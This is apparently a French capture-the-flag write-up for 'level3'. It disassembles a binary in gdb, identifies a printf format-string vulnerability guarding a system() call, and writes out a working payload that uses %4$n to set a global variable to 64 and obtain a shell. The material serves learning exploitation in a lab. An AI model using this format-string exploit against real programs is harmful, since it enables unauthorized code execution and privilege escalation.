Nous avons encore un programme qui repette ce qu'on lui donne.

On fait un gdb avec info functions qui nous indique 2 fonction main et v 

main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret
End of assembler dump.

v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x218,%esp
   0x080484ad <+9>:     mov    0x8049860,%eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp)
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
   0x080484be <+26>:    lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:    mov    %eax,(%esp)
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:    mov    %eax,(%esp)
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    0x8049880,%eax
   0x080484e9 <+69>:    mov    %eax,%edx
   0x080484eb <+71>:    mov    $0x8048600,%eax
   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
   0x08048504 <+96>:    mov    %eax,(%esp)
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   movl   $0x804860d,(%esp)
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave
   0x08048519 <+117>:   ret
End of assembler dump.

La fonction v est celle qui nous interesse, il y a un appelle systeme qui on supose est un /bin/sh cependant, on remarque que c'est protégé par une variable m qui doit avoir la valeur 64 pour aller vers l'appel système

Notre objectif est donc modifier la valeur de cette variable.

Nous pouvons toujours utiliser get pour envoyer des payloads et printf semble etre interessant car vulnerable au format string exploit. 

Quand printf reçoit une chaîne de format, il lit les %x, %n, etc. et va chercher les arguments correspondants directement sur la pile, en supposant qu'ils existent — même s'ils n'ont pas été passés explicitement.

Donc quand on envoie %x %x %x %x, printf fait :

"j'ai 4 spécificateurs, je vais lire 4 valeurs sur la pile"
→ il lit ce qui se trouve là, peu importe ce que c'était vraiment

Afin de trouver quel argument de notre printf est le buffer de get nous alons faire ceci
`python -c 'print "aaaa %x %x %x %x %x %x %x %x %x %x"' > /tmp/exploit`
qui renvoie
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078
or 61616161 c'est notre aaaa donc notre buffer

on veut que notre m est une valeur 64

on va donc créer un buffer avec l'adresse de valeur 4 (adresse de m = 0x804988c) + 60*A pour remplir jusqu'à 6 puis nous allons ajouter "%4$n" pour que printf ecrive dans le 4eme argument notre buffern qui aura l'adresse de m.

`python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/exploit`

puis on met l'expoit dans level3

`cat /tmp/exploit - | ./level3`